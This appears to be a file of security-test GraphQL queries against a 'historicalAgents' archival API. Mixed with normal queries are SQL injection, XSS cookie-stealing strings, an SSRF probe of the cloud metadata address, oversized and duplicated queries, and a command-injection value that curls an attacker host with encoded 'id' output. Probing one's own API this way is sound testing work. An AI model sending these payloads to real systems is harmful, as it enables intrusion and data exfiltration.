query.query:
query {
  historicalAgents(first: 5) {
    items {
      id
      type
      identifier
      descriptions {
        name
      }
    }
    pageInfo {
      hasNextPage
    }
  }
}

query {
  historicalAgents(after: "1' UNION SELECT NULL,version()--") {
    items {
      id
      source: descriptions {
        biographicalHistory
      }
    }
  }
}

query {
  historicalAgents {
    items {
      descriptions {
        biographicalHistory(text: "<script>alert(document.cookie)</script>")
        generalContext
      }
    }
  }
}

query {
  historicalAgents {
    items {
      links {
        body {
          name(url: "http://169.254.169.254/latest/meta-data")
        }
      }
    }
  }
}

query {
  historicalAgents {
    items {
      systemEvents {
        logMessage(input: "; curl https://attacker.com/$(id | base64)")
      }
    }
  }
}

query {
  historicalAgents {
    items {
      descriptions {
        name(html: "<img src=x onerror=alert(1)>")
      }
    }
  }
}

query {
  historicalAgents(first: 1000) {
    items {
      id
      descriptions {
        sources
        mandates
      }
      systemEvents {
        timestamp
      }
    }
  }
}

query {
  s: historicalAgents(first: 500) {
    items { id }
  }
  t: historicalAgents(first: 500) {
    items { id }
  }
}

query {
  historicalAgents {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query {
  historicalAgents {
    items {
      identifer
      descripions {
        langageCode
      }
    }
  }
}
